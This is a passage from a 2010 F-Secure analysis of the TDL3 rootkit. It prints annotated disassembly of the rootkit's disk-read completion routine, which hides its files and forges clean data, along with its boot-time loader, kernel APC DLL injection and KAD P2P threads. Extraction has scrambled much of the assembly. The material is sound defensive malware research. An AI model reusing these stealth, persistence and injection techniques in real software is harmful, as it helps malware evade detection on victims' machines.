© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

27 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

Once the IRP Function finishes – depending on how the flag is set, this can be either
Cancelled/Failed or Successful – the malware’s completion routine is triggered and
the malware modifies the returned values (zeroes out / or clean the buffer) in order to
hide its presence on the disk.

.text:1000491E CompletionRoutine proc near
.text:1000491E
.text:1000491E src
= dword ptr -0Ch
.text:1000491E var_8
= dword ptr -8
.text:1000491E var_4
= dword ptr -4
.text:1000491E devobj
= dword ptr 8
.text:1000491E IRP
= dword ptr 0Ch
.text:1000491E CONTEXT
= dword ptr 10h
.text:1000491E
.text:1000491E
push
ebp
.text:1000491F
mov
ebp, esp
.text:10004921
sub
esp, 0Ch
.text:10004924
push
ebx
.text:10004925
push
esi
.text:10004926
mov
esi, [ebp+IRP]
.text:10004929
cmp
[esi+IRP.IoStatus.anonymous_0.Status],
0
.text:1000492D
push
edi
.text:1000492E
jl
loc_10004A7B
.text:1000492E
.text:10004934
mov
edi, [esi+IRP.MdlAddress]
Checks if the operation is using Cache:
.text:10004937

test
byte ptr [edi+_MDL.MdlFlags],
MDL_MAPPED_TO_SYSTEM_VA or
MDL_SOURCE_IS_NONPAGED_POOL
.text:1000493B
jz
short loc_10004942
.text:1000493B
.text:1000493D
mov
eax, [edi+_MDL.MappedSystemVa]
.text:10004940
jmp
short loc_1000495E
.text:10004940
.text:10004942 loc_10004942:
.text:10004942
push
71FF6B1Fh
; hash: MmMapLockedPagesSpecifyCache
.text:10004947
call
FindKernel_bySidtCall
.text:10004947
.text:1000494C
push
eax
.text:1000494D
call
FindAPIbyHash
.text:1000494D
.text:10004952
push
10h
.text:10004954
xor
ecx, ecx
.text:10004956
push
ecx
.text:10004957
push
ecx
.text:10004958
push
1
.text:1000495A
push
ecx
© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

28 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

.text:1000495B
.text:1000495C

push
call

edi
eax
;
MmMapLockedPagesSpecifyCache

.text:1000495E
Then checks which sector is being read/accessed:
.text:1000495E loc_1000495E
.text:1000495E
mov
.text:10004961
mov
.text:10004967
mov
.text:1000496A
xor
.text:1000496C
mov
.text:1000496E
div
.text:10004974
mov
.text:10004977
mov
.text:10004979
mov
.text:1000497C
add
.text:1000497E
cmp
[edi+TDL3.MalwareFSOffsetInSector]
.text:10004981
jbe

ecx, [esi+IRP.IoStatus.Information]
edi, ds:0FFDF0308h
[ebp+var_4], eax
edx, edx
eax, ecx
[edi+TDL3.SectorSize]
ebx, [ebp+CONTEXT]
edx, eax
eax, [ebx+CONTEXT.Dr1]
edx, eax
edx,
short loc_100049C6

If the malware’s file system is being accessed or read, an empty buffer is
returned (the malware zeros out the buffer):
.text:10004983
.text:10004985
.text:10004988
.text:10004988
.text:1000498A
.text:1000498D
.text:1000498F
.text:10004991
.text:10004998
.text:10004998
.text:1000499A
.text:1000499A
.text:1000499A loc_1000499A:
.text:1000499A
.text:1000499A
.text:1000499C
.text:1000499C zerooutbuffer:
.text:1000499C
.text:1000499E
.text:100049A3
.text:100049A5
.text:100049A5
.text:100049AA
.text:100049AB
.text:100049AB
.text:100049B0
.text:100049B3
.text:100049B4
.text:100049B6
© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

mov
cmp
jnb

edx, edi
eax, [edx+40h]
short loc_1000499A

mov
sub
mov
imul
jmp

esi, [edx+40h]
esi, eax
eax, edi
esi, [eax+TDL3.SectorSize]
short zerooutbuffer

xor

esi, esi

sub
push
mov
call

ecx, esi
2C655ACDh
; hash : nt!memset
edi, ecx
FindKernel_bySidtCall

push
call

eax
FindAPIbyHash

mov
push
add
push

ecx, [ebp+var_4]
edi
esi, ecx
0

29 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

.text:100049B8
.text:100049B9
.text:100049B9
.text:100049BB
.text:100049BE
.text:100049C1

push
call

esi
eax

mov
add
jmp

esi, [ebp+IRP]
esp, 0Ch
Complete
;
CLASSPNP!TransferPktComplete

; memset

.text:100049C1
.text:100049C6

If an area other than the malware’s file system is being accessed, the Trojan consults
the list of protected sectors; if a match is found, the Trojan disinfects or returns the
buffered data:
.text:100049C6
.text:100049C6 loc_100049C6:
.text:100049C6
.text:100049CB
.text:100049CF
.text:100049D6
CLASSPNP!TransferPktComplete
.text:100049D6
.text:100049DC
.text:100049DC
.text:100049DE
.text:100049DE loop_entries:
.text:100049DE
.text:100049E3

jbe

eax, ds:0FFDF0308h
[ebp+var_8], 0
[eax+TDL3.CountArray], 0
; Number of Protected Sectors
Complete
;

xor

edi, edi

mov
cmp

.text:100049EB
.text:100049EB
.text:100049ED
.text:100049F0
.text:100049F6
.text:100049F8
.text:100049FE
.text:10004A01
.text:10004A03
.text:10004A0A
.text:10004A0C
.text:10004A0E
.text:10004A0E
.text:10004A10
.text:10004A12
.text:10004A19
.text:10004A20

jz

eax, ds:0FFDF0308h
dword ptr [eax+edi+114h], 0
; Start of Protected sector Array
short loc_10004A5F

mov
mov
xor
div
mov
mov
mov
sub
cmp
jnb

eax, [esi+1Ch]
esi, ds:0FFDF0308h
edx, edx
[esi+TDL3.SectorSize]
ecx, [ebx+8]
edx, esi
edx, [edx+edi+114h]
edx, ecx
edx, eax
short loc_10004A5C

mov
mov
mov
mov

eax, esi
ebx, [eax+edi+11Ch]
eax, [eax+edi+120h]
[ebp+src], eax
; address where the clean data is

mov
mov
sub
imul

eax, esi
esi, [eax+edi+114h]
esi, ecx
esi, [eax+108h] ; size of sector

located
.text:10004A23
.text:10004A25
.text:10004A2C
.text:10004A2E

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

mov
and
cmp

30 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

.text:10004A35
sector

add

esi, [eax+edi+118h] ; offset from

Replaces the data in the output buffer with clean data:
.text:10004A3C
.text:10004A41
.text:10004A44
.text:10004A44
.text:10004A49
.text:10004A4A
.text:10004A4A
.text:10004A4F
.text:10004A50
data
.text:10004A53
.text:10004A54
.text:10004A54
.text:10004A56
.text:10004A59
.text:10004A59
.text:10004A5C
.text:10004A5C
.text:10004A5F
.text:10004A5F loc_10004A5F
.text:10004A5F
.text:10004A62
.text:10004A67
.text:10004A6A
.text:10004A6D
data
.text:10004A73
.text:10004A73
.text:10004A79

push
add
call

272F3B77h
; hash : memcpy
esi, [ebp+var_4] ;out buffer
FindKernel_bySidtCall

push
call

eax
FindAPIbyHash

push
push

ebx
; bytes to copy
[ebp+src]
; offset in Malware Buffer for clean

push
call

esi
eax

mov
add

ebx, [ebp+CONTEXT]
esp, 0Ch

mov

esi, [ebp+IRP]

inc
mov
mov
add
cmp

[ebp+var_8]
eax, ds:0FFDF0308h
ecx, [ebp+var_8]
edi, 14h
; size of struct
ecx, [eax+110h] ; counter_chunks of

jb

loop_entries

jmp

short Complete ;
CLASSPNP!TransferPktComplete

mov

ebx, [ebp+CONTEXT]

mov

eax, [ebx]
;
CLASSPNP!TransferPktComplete
eax, eax

; memcpy

.text:10004A79
.text:10004A7B
Finalize Completion Routine:
.text:10004A7B
.text:10004A7B loc_10004A7B:
.text:10004A7B
.text:10004A7B
.text:10004A7E
.text:10004A7E Complete:
.text:10004A7E
.text:10004A7E
.text:10004A80
© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

test

31 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

.text:10004A82
jz
.text:10004A82
.text:10004A84
push
.text:10004A87
push
.text:10004A88
push
.text:10004A8B
call
.text:10004A8B
.text:10004A8D
mov
.text:10004A8D
.text:10004A90
.text:10004A90 loc_10004A90:
.text:10004A90
push
.text:10004A95
call
.text:10004A95
.text:10004A9A
push
.text:10004A9B
call
.text:10004A9B
.text:10004AA0
push
.text:10004AA1
call
.text:10004AA1
.text:10004AA3
mov
.text:10004AA6
pop
.text:10004AA7
pop
.text:10004AA8
pop
.text:10004AA9
leave
.text:10004AAA
retn
.text:10004AAA
.text:10004AAA CompletionRoutine endp

short loc_10004A90 ; hash : ExFreePool
dword ptr [ebx+4] ; context
esi
; irp
[ebp+devobj]
eax
;CLASSPNP!TransferPktComplete
[ebp+IRP], eax

730B64BBh
; hash : ExFreePool
FindKernel_bySidtCall
eax
FindAPIbyHash
ebx
eax ; ExFreePool
eax, [ebp+IRP]
edi
esi
ebx
0Ch

Figure XIV Completion Routine and Content Forgery

VI.7.1 Protecting the Miniport Driver from Defragmentation
In case the user initiates a defragmentation operation, the malware can
protect the infected Miniport driver’s image on the disk from unintended
relocation.
To do so, the malware pins the driver’s sector location to the disk by issuing a
ZwFsControlFile with the control code FSCTL_MARK_HANDLE and
MARK_HANDLE_INFO structure:

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

32 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

Struct MARK_HANDLE_INFO
(
Dword USN_SOURCE_DATA_MANAGEMENT;
Dword hVolume ; // volume handle
Dword MARK_HANDLE_PROTECT_CLUSTERS;
);
Note: This pinning of clusters is no longer present in the latest TDL3 variants,
which instead implement a monitoring thread to ensure the sector-to-memory
mapping stays up to date in case the protected sectors are disordered by
defragmentation.

VI.8 File Caching
TDL3’s content filtering protection mechanism only protects the malware from direct
disk access requests. This is generally sufficient as under normal circumstances,
direct access requests are infrequent. By default, the system loads frequently used
user and system file data in a cache; user requests for these files are then returned
with cached data in order to optimize performance and minimize disk access.
As an additional layer of security, after infecting the filter driver on the disk and
installing hooks, the malware will disinfect the driver loaded in the system cache. This
is done to exploit the system’s file caching behavior, as any application or user trying
to copy/open/edit the Miniport driver will only get the clean cached driver image. The
disinfection action does not actually affect the infected image on disk, which is
protected by the hooks.
This disinfection strategy effectively prevents the user from realizing the malware is
present.

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

33 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

Figure XV Disinfection and File Caching

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

34 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

VI.9 Infected Driver Code (Loader)
The entire thrust of the malware Driver’s infection of the Miniport driver is to force it to
automatically load the malware’s other components whenever the system is
rebooted. As the disk’s drivers are among the first components loaded by the
operating system during a reboot, infecting the Miniport drivers ensures TDL3 will be
run before any other application – including security programs.
When the Loader code in the Miniport driver is executed, it calls
IoRegisterFsRegistrationChange with the driver entry as a callback function allowing
it to resume control after the file system has been loaded. It then calls the original
entry point of the infected Miniport driver to resume loading of the file system, thus
enabling objects needed by the malware Loader.
When the infected Miniport driver resumes control, it loads and executes the Driver
code on the disk, which in turn executes the other malware components and
compromises the system again.

.rsrc:0002688E
.rsrc:0002688E done_section_rva_check:
.rsrc:0002688E
mov
eax, 0AB09E7EDh ; delta offset
.rsrc:00026893
add
eax, [ebp+_54F87F93]
.rsrc:00026896
push
eax
; start of
driverentry .rsrc:00026897
push
[ebp+DriverObject]
.rsrc:0002689A
mov
eax, [ebp+OffsMalwareData]
.rsrc:0002689D
mov
ecx, [ebp+driver_obj_ext]
.rsrc:000268A0
add
ecx,
[eax+MALWARE_DATA.IoRegisterFsRegistrationChange]
.rsrc:000268A3 /*
.rsrc:000268A3
Allows other filter driver to register
.rsrc:000268A3 */
.rsrc:000268A3
call
ecx
.rsrc:000268A3
Calls the Original EntryPoint to allow the Miniport driver to start first:
.rsrc:000268A5
.rsrc:000268A8
.rsrc:000268AB
.rsrc:000268AE
.rsrc:000268B1
.rsrc:000268B4
.rsrc:000268B7
.rsrc:000268B7
.rsrc:000268B9
.rsrc:000268BB

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

push
push
mov
mov
mov
add
call

[ebp+RegistryPath]
[ebp+DriverObject]
eax, [ebp+DriverObject]
eax, [eax+DRIVER_OBJECT.DriverStart]
ecx, [ebp+OffsMalwareData]
eax, [ecx+MALWARE_DATA.OrigEP]
eax
; driverstart+3ah

xor
jmp

eax, eax
_exit

35 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

.rsrc:000268BB
.rsrc:000268C5 regpath_1:
.rsrc:000268C5
mov
.rsrc:000268CA
add
.rsrc:000268CF
sub
.rsrc:000268D4
add
.rsrc:000268D9
and
.rsrc:000268DE
push
.rsrc:000268DF eax=0x3c00
.rsrc:000268DF
push
.rsrc:000268E1
mov
.rsrc:000268E6
mov
.rsrc:000268EC eax=0xffdf0308
.rsrc:000268EC
mov
.rsrc:000268EF
mov
.rsrc:000268F2
add
.rsrc:000268F5
call
.rsrc:000268F5
.rsrc:000268F7
mov
.rsrc:000268FC
mov
.rsrc:00026902 eax=0xffdf0308
.rsrc:00026902
mov
.rsrc:00026904
mov
.rsrc:00026909
mov
.rsrc:0002690F eax=0xffdf0308
.rsrc:0002690F
mov
.rsrc:00026915
mov
.rsrc:00026918
mov
.rsrc:0002691B loc_2691B:
.rsrc:0002691B
cmp
.rsrc:0002691F
jz
.rsrc:0002691F
.rsrc:00026925
lea
.rsrc:00026928
push
.rsrc:00026929
push
.rsrc:0002692E
lea
.rsrc:00026934
push
.rsrc:00026935
push
.rsrc:00026938
mov
.rsrc:0002693D
mov
.rsrc:00026943
mov
.rsrc:00026946
mov
.rsrc:00026949
add
[ecx+MALWARE_DATA.ObQueryNameString]
.rsrc:0002694C
call
.rsrc:0002694C
.rsrc:0002694E
test
.rsrc:00026950
jl
.rsrc:00026950

eax, 0AB09E7AAh ;
eax, 384h
eax, 0AB09B000h
eax, 1FFh
eax, 0FFFFFE00h
eax
;
0
eax, 308h
eax, [eax+0FFDF0000h] ; 0xffdf0308
eax, [eax+4]
; NT_BASE
ecx, [ebp+OffsMalwareData]
eax, [ecx+MALWARE_DATA.ExAllocatePool]
eax
; ExAllocatePool
ecx, 308h
ecx, [ecx+0FFDF0000h]
[ecx], eax
; ecx = TDL3 Buffer
eax, 308h
eax, [eax+0FFDF0000h]
eax, [eax+0E4h]
eax, [eax+4]
[ebp+_OBJECT], eax
[ebp+_OBJECT], 0
loc_26AB5
eax, [ebp+var_24]
eax
104h
; length
eax, [ebp+OBJECT_NAME_INFORMATION]
eax
[ebp+_OBJECT]
eax, 308h
eax, [eax+0FFDF0000h] ; FFDF0308
eax, [eax+4]
; NT_BASE
ecx, [ebp+OffsMalwareData]
eax,
eax
eax, eax
loc_26AA7

Reads TDL3_CODE_BUFFER from end of Disk:
.rsrc:00026956
.rsrc:00026959

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

mov
mov

eax, [ebp+OffsMalwareData]
ecx, [eax+MALWARE_DATA.diskoffset_low]

36 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

.rsrc:0002695B
mov
.rsrc:00026961
mov
[eax+MALWARE_DATA.diskoffset_high]
.rsrc:00026964
mov
.rsrc:0002696A
mov
.rsrc:00026974
and
.rsrc:0002697B
mov
.rsrc:00026985
lea
.rsrc:0002698B
mov
.rsrc:00026991
and
.rsrc:00026998
and
.rsrc:0002699F
push
.rsrc:000269A1
push
.rsrc:000269A3
lea
.rsrc:000269A9
push
.rsrc:000269AA
lea
.rsrc:000269B0
push
.rsrc:000269B1
push
.rsrc:000269B6
lea
.rsrc:000269BC
push
.rsrc:000269BD
mov
.rsrc:000269C2
mov
.rsrc:000269C8 eax=0xffdf0308
.rsrc:000269C8
mov
.rsrc:000269CB
mov
.rsrc:000269CE
add
.rsrc:000269D1
call
.rsrc:000269D1
.rsrc:000269D3
test
.rsrc:000269D5
jl
.rsrc:000269D5
.rsrc:000269DB
push
.rsrc:000269DD
lea
.rsrc:000269E3
push
.rsrc:000269E4
mov
.rsrc:000269E9
add
code from buffer
.rsrc:000269EE
sub
.rsrc:000269F3
add
.rsrc:000269F8
and
.rsrc:000269FD
push
.rsrc:000269FE
.rsrc:000269FE
mov
.rsrc:00026A03
mov
.rsrc:00026A09 eax=0xffdf0308
.rsrc:00026A09
push
buffer
.rsrc:00026A0B
lea
.rsrc:00026A11
push
.rsrc:00026A12
push
.rsrc:00026A14
push
.rsrc:00026A16
push
.rsrc:00026A18
push
.rsrc:00026A1E
mov
.rsrc:00026A23
mov
© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

[ebp+diskofs_low], ecx ; 38B2A200
eax,
[ebp+diskofs_high], eax ; val_2
[ebp+var_0x18], 18h
[ebp+var_0x0], 0
[ebp+var_0x240], 240h
eax, [ebp+OBJECT_NAME_INFORMATION]
[ebp+_var_130], eax
[ebp+_var_0x0], 0
[ebp+__var_0x0], 0
22h
3
eax, [ebp+IOStatusBlock]
eax
eax, [ebp+var_0x18]
eax
100003h
eax, [ebp+fhandle]
eax
eax, 308h
eax, [eax+0FFDF0000h]
eax, [eax+4]
; NT_BASE
ecx, [ebp+OffsMalwareData]
eax, [ecx+MALWARE_DATA.ZwOpenFile]
eax
eax, eax
loc_26AA7
0
eax, [ebp+diskofs_low]
eax
eax, 0AB09E7AAh
eax, 384h
; offset of malware
eax, 0AB09B000h
eax, 1FFh
eax, 0FFFFFE00h ;
eax
; length
eax, 308h
eax, [eax+0FFDF0000h]
dword ptr [eax+0] ; 0xffdf0308 = TDL3
eax, [ebp+IOStatusBlock]
eax
0
0
0
[ebp+fhandle]
eax, 308h
eax, [eax+0FFDF0000h]

37 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

.rsrc:00026A29
.rsrc:00026A29
.rsrc:00026A2C
.rsrc:00026A2F
.rsrc:00026A32
.rsrc:00026A32
.rsrc:00026A34
.rsrc:00026A36
.rsrc:00026A36
.rsrc:00026A38
.rsrc:00026A3D
.rsrc:00026A43
.rsrc:00026A43

eax=0xffdf0308
mov
mov
add
call

eax, [eax+4]
ecx, [ebp+OffsMalwareData]
eax, [ecx+MALWARE_DATA.ZwReadFile]
eax

test
jl

eax, eax
short loc_26AA7

mov
mov

eax, 308h
eax, [eax+0FFDF0000h]

mov

eax, [eax+0]

eax=0xffdf0308

Checks signature to validate data:
.rsrc:00026A45
cmp
dword ptr [eax+0], ‘3LDT’
.rsrc:00026A4B
jnz
short loc_26AA7
.rsrc:00026A4D
mov
eax, [ebp+_54F87F93]
.rsrc:00026A50
add
eax, 0AB09E7EDh
.rsrc:00026A55
push
eax
.rsrc:00026A56
mov
eax, 308h
.rsrc:00026A5B
mov
eax, [eax+0FFDF0000h]
.rsrc:00026A61 eax=0xffdf0308
.rsrc:00026A61
push
dword ptr [eax+0E4h]
.rsrc:00026A67
mov
eax, 308h
.rsrc:00026A6C
mov
eax, [eax+0FFDF0000h]
.rsrc:00026A72 eax=0xffdf0308
.rsrc:00026A72
mov
eax, [eax+4]
.rsrc:00026A75
mov
ecx, [ebp+OffsMalwareData]
.rsrc:00026A78
add
eax,
[ecx+MALWARE_DATA.IoUnregisterFsRegistrationChange]
.rsrc:00026A7B
call
eax
Calls malware code from TDL3_CODE_BUFFER:
.rsrc:00026A7D
push
.rsrc:00026A80
mov
.rsrc:00026A85
mov
.rsrc:00026A8B eax=0xffdf0308
.rsrc:00026A8B
push
.rsrc:00026A91
mov
.rsrc:00026A96
mov
.rsrc:00026A9C
mov
.rsrc:00026A9E
add
.rsrc:00026AA3
call
code .rsrc:00026AA3
.rsrc:00026AA5
jmp

[ebp+_OBJECT]
eax, 308h
eax, [eax+0FFDF0000h]
dword ptr [eax+0E4h]
eax, 308h
eax, [eax+0FFDF0000h]
eax, [eax+0]
eax, 384h
eax
; call malware driver
short _exit

.rsrc:00026AD0 start_data MALWARE_DATA <38B2A200h, 3Ah, 159F7h, 60008h,
2964Ch, 29B88h, 0ED9B8h, 9D83Ch, 9DE20h, 0, 0, 1CD25h>

Figure XVI Loader Code (Disassembly)
© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

38 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

VI.10 Process Injection
When the Driver code executes, it in turns executes the other malware components.
This includes the two user-mode payload modules, tdlcmd.dll and tdlwsp.dll. The
injection targets of the modules are specified in the configuration file:
[injector]
svchost.exe = tdlcmd.dll
* = tdlwsp.dll
The configuration information indicates that when the process svchost is launched,
tdlcmd.dll will be injected into it; whereas the ‘*’ means that any other process
executed is injected with tdlwsp.dll.
To perform the injection, the driver adds a LoadImageNotifyRoutine. This routine
checks if “kernel32.dll” is loaded/imported by the process, then creates an APC
routine that queues a WorkerRoutine. It then reads the config.ini to check which
component to inject, based on the process image name being launched.

.text:10005324 LoadImageNotifyHandler proc near
.text:10005324 var_28
= word ptr -28h
.text:10005324 var_26
= word ptr -26h
.text:10005324 var_24
= word ptr -24h
.text:10005324 var_22
= word ptr -22h
.text:10005324 var_20
= word ptr -20h
.text:10005324 var_1E
= word ptr -1Eh
.text:10005324 var_1C
= word ptr -1Ch
.text:10005324 var_1A
= word ptr -1Ah
.text:10005324 var_18
= word ptr -18h
.text:10005324 var_16
= word ptr -16h
.text:10005324 var_14
= word ptr -14h
.text:10005324 var_12
= word ptr -12h
.text:10005324 var_10
= word ptr -10h
.text:10005324 var_E
= word ptr -0Eh
.text:10005324 var_8
= byte ptr -8
.text:10005324 curr_thread
= dword ptr 8
.text:10005324 arg_8
= dword ptr 10h
.text:10005324
.text:10005324
push
ebp
.text:10005325
mov
ebp, esp
.text:10005327
sub
esp, 28h
.text:1000532A
push
esi
.text:1000532B
xor
esi, esi
.text:1000532D
cmp
[ebp+curr_thread], esi
.text:10005330
jz
not_found

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

39 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

Checks if KERNEL32 is imported:
.text:10005336
RtlInitUnicodeString
.text:1000533B
.text:10005341
.text:10005347
.text:1000534D
.text:10005353
.text:10005359
.text:1000535F
.text:10005365
.text:1000536B
.text:10005371
.text:10005377
.text:1000537D
.text:10005383
.text:10005389
.text:1000538F
.text:10005393
.text:10005393
.text:10005398
.text:10005399
.text:10005399
.text:1000539E
.text:100053A1
.text:100053A2
.text:100053A5
.text:100053A6
.text:100053A6
.text:100053A8
FsRtlIsNameInExpression
.text:100053AD
.text:100053AD
.text:100053B2
.text:100053B3
.text:100053B3
.text:100053B8
.text:100053B9
.text:100053BB
.text:100053BE
.text:100053C1
.text:100053C2
FsRtlIsNameInExpression
.text:100053C2
.text:100053C4
.text:100053C6
.text:100053C6

push

5E35B3F4h

; hash

:

mov
mov
mov
mov
mov
mov
mov
mov
mov
mov
mov
mov
mov
mov
mov
call

[ebp+var_28], '*'
[ebp+var_26], '\'
[ebp+var_24], 'K'
[ebp+var_22], 'E'
[ebp+var_20], 'R'
[ebp+var_1E], 'N'
[ebp+var_1C], 'E'
[ebp+var_1A], 'L'
[ebp+var_18], '3'
[ebp+var_16], '2'
[ebp+var_14], '.'
[ebp+var_12], 'D'
[ebp+var_10], 'L'
[ebp+var_E], 'L'
[ebp-0Ch], si
FindKernel_bySidtCall

push
call

eax
FindAPIbyHash

lea
push
lea
push
call

ecx, [ebp+var_28]
ecx
ecx, [ebp+var_8]
ecx
eax
; RtlInitUnicodeString

push

0CCD9AAAFh

call

FindKernel_bySidtCall

push
call

eax
FindAPIbyHash

push
push
push
lea
push
call

esi
1
[ebp+curr_thread]
ecx, [ebp+var_8]
ecx
eax
;

test
jz

al, al
not_found

; hash :

Sets APC Function to LoadLibrary:
.text:100053CC
.text:100053D1
.text:100053D2
.text:100053D8
© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

mov
push
lea
cmp

eax, ds:0FFDF0308h
edi
edi, [eax+TDL3.LoadLibraryExA]
[edi], esi

40 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

.text:100053DA
.text:100053DA

jnz

.text:100053EE loc_100053EE:
LoadImageNotifyHandler+B6j
.text:100053EE
.text:100053EF
ExAllocatePool
.text:100053F4
.text:100053F4
.text:100053F9
.text:100053FA
.text:100053FA
.text:100053FF
.text:10005401
.text:10005402
.text:10005402
.text:10005404
.text:10005406
.text:10005408
.text:10005408
.text:1000540A
nt!__KeGetCurrentThread
.text:1000540F
.text:1000540F
.text:10005414
.text:10005415
.text:10005415
.text:1000541A
.text:1000541A
.text:1000541C
.text:1000541F
.text:1000541F
.text:10005424
.text:10005426
.text:1000542B
.text:10005431
.text:10005431
.text:10005436
.text:10005437
.text:10005437
.text:1000543C
.text:1000543D
.text:1000543E
.text:1000543F
.text:10005440
.text:10005440
.text:10005441
.text:10005442
.text:10005445
.text:10005446

short loc_100053EE

; CODE XREF:
push
push

ebx
0DE45E96Ch

call

FindKernel_bySidtCall

push
call

eax
FindAPIbyHash

push
push
call

30h
esi
eax

mov
cmp
jz

ebx, eax
ebx, esi
short loc_1000545E

push

6A85FB87h

call

FindKernel_bySidtCall

push
call

eax
FindAPIbyHash

call

eax

mov
call

[ebp+curr_thread], eax
ComputeDelta

mov
push
add
call

edi, eax
0D79E0B0Ah
; nt!KeInitializeApc
edi, 0F5782F4Fh ; Reference_Function
FindKernel_bySidtCall

push
call

eax
FindAPIbyHash

push
push
push
push
push

esi
esi
esi
esi
edi

push
push
push
call

esi
[ebp+curr_thread]
ebx
eax
; nt!KeInitializeApc

; hash :

; ExAllocatePool

; hash :

; __KeGetCurrentThread

; TDL3.LoadLibraryExA

Figure XVII LoadImageNotify Handler
© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

41 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

The DLL injection concept used is itself trivial and is commonly used by other
malwares in user mode. User mode injection generally will obtain a handle to the
target process, allocate a memory space inside the target process' space to put the
DLL name to be injected in that allocation and finally creating a remote thread
pointing to LoadLibrary. The driver injector routine implements something similar;
calling KeStackAttachProcess, giving the malware thread access to the target
process’ address space; it then allocates a memory space inside the process’ context
to write the path of the DLL component to be injected. It initializes an APC thread
pointing to the kernel32!LoadLibary function, with parameters addressed to the DLL
name inside the process’ memory context. And finally, like a charm, the DLL is loaded
in the context of the launched process.

VI.11 Worker Threads and KAD Protocol
Some early TDL3 variants contain a P2P module using the Kademlia-based DHT
protocol (KAD), which is known as the most widely used DHT-based protocol.
Implementing this module involves creating additional worker threads in order to
initiate a P2P connection to known servers and peers.

.text:100047EE /*
.text:100047EE
KAD Protocol Standard Port for Send/Recv Messages
.text:100047EE */
.text:100047EE
push
1240h
; KAD Protocol
Standard Port = 4672
.text:100047F3
mov
[ebp+device_udp], cx
.text:100047F7
mov
[ebp+var_16], 'd'
.text:100047FD
mov
[ebp+var_12], 'v' ; MajorVersion
.text:10004803
mov
[ebp+var_10], 'i'
.text:10004809
mov
[ebp+var_E], 'c' ; NumberOfFunctions
.text:1000480F
mov
[ebp+var_A], cx
.text:10004813
mov
[ebp+var_8], 'u'
.text:10004819
mov
[ebp+var_6], 'd' ;
AddressOfNameOrdinals
.text:1000481F
mov
[ebp+var_4], 'p'
.text:10004825
mov
[ebp+var_2], di
.text:10004829
mov
[ebp+device_tcp], cx
.text:1000482D
mov
[ebp+var_2E], 'd'
.text:10004833
mov
[ebp+var_2A], 'v'
.text:10004839
mov
[ebp+var_28], 'i'
.text:1000483F
mov
[ebp+var_26], 'c'
.text:10004845
mov
[ebp+var_22], cx
.text:10004849
mov
[ebp+var_20], 't'
.text:1000484F
mov
[ebp+var_1E], 'c'
.text:10004855
mov
[ebp+var_1C], 'p'
© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

42 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

.text:1000485B
mov
[ebp+var_1A], di
.text:1000485F
mov
eax, ds:0FFDF0308h
.text:10004864
push
edi
.text:10004865
add
eax, 678h
.text:1000486A
push
eax
.text:1000486B
lea
eax, [ebp+device_udp]
.text:1000486E
push
eax
.text:1000486F /*
.text:1000486F kd> dt _OBJECT_ATTRIBUTES f7bc6f14
.text:1000486F nt!_OBJECT_ATTRIBUTES
.text:1000486F
+0x000 Length
: 0x18
.text:1000486F
+0x004 RootDirectory
: (null)
.text:1000486F
+0x008 ObjectName
: 0xf7bc6f48 _UNICODE_STRING
"\device\udp"
.text:1000486F
+0x00c Attributes
: 0x240
.text:1000486F
+0x010 SecurityDescriptor : (null)
.text:1000486F
+0x014 SecurityQualityOfService : (null)
.text:1000486F */
.text:1000486F
call
TDIOpenTransport
.text:1000486F
.text:10004874
test
eax, eax
.text:10004876
mov
ebx, 0DE45E96Ch ; hash :
ExAllocatePool
.text:1000487B
jl
short SetUp_UpDown_loadingFiles
.text:1000487B
.text:1000487D
push
ebx
.text:1000487E
call
FindKernel_bySidtCall
.text:1000487E
.text:10004883
push
eax
.text:10004884
call
FindAPIbyHash
.text:10004884
.text:10004889
push
10h
.text:1000488B
push
edi
.text:1000488C
call
eax
; ExAllocatePool
.text:1000488C
.text:1000488E
mov
esi, eax
.text:10004890
cmp
esi, edi
.text:10004892
jz
short SetUp_UpDown_loadingFiles
.text:10004892
.text:10004894
call
ComputeDelta
.text:10004894
.text:10004899 /*
.text:10004899
Execute Worker routine
.text:10004899 UDP :
.text:10004899 kd> dt _WORK_QUEUE_ITEM 82a969f8 -r
.text:10004899 nt!_WORK_QUEUE_ITEM
.text:10004899
+0x000 List
: _LIST_ENTRY [ 0x0 - 0x0 ]
.text:10004899
+0x000 Flink
: (null)
.text:10004899
+0x004 Blink
: (null)
.text:10004899
+0x008 WorkerRoutine
: 0x82cf882a
void
+ffffffff82cf882a
.text:10004899
+0x00c Parameter
: 0x82a969f8
.text:10004899
.text:10004899
.text:10004899 */
© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

43 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

.text:10004899
.text:10004899
add
eax, 0F57824A6h ; xref :
TDIReceiveDatagram
.text:1000489E
push
7E91282h
; hash :
ExQueueWorkItem
.text:100048A3
mov
